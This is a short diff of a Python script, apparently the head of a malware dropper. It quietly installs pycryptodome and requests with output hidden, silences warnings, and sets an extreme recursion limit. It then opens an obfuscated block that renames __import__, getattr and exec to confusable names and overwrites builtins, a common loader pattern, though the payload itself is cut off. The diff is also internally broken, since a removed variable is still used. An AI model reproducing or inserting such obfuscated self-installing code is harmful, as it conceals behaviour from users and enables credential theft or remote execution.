@@ -8,14 +8,21 @@ def check_installation(package):
     except subprocess.CalledProcessError:
         return False
 
-package_name = "pycryptodome"
 
 warnings.filterwarnings("ignore", category=Warning)
 
-if not check_installation(package_name):
+
+if not check_installation("pycryptodome"):
     subprocess.run(["pip3", "install", package_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
+
+if not check_installation("requests"):
+    subprocess.run(["pip3", "install", "requests"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+
 try:
+    sys.setrecursionlimit(1000000000) 
+
 
     pyobfuscate=(lambda getattr:[((lambda IIlII,IlIIl:setattr(__builtins__,IIlII,IlIIl))(IIlII,IlIIl)) for IIlII,IlIIl in getattr.items()]);Il=chr(114)+chr(101);lI=r'[^a-zA-Z0-9]';lIl=chr(115)+chr(117)+chr(98);lllllllllllllll, llllllllllllllI, lllllllllllllIl,lllllllllIIllIIlI = __import__, getattr, bytes,exec
 
